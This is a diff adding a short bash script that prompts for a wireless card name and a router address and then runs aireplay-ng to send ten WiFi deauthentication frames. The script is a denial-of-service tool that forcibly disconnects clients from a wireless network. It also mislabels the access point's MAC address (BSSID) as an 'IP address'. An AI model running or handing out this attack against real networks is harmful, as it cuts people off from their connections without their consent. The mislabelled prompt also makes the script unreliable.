@@ -1,0 +1,15 @@
+#!/bin/bash
+
+echo "WHat is the wireless card name"
+
+read card
+
+echo "What is the router IP address"
+
+read IP
+
+sleep 1
+
+echo "Performing De-Authentication now"
+
+aireplay-ng -0 10 -a $IP $card
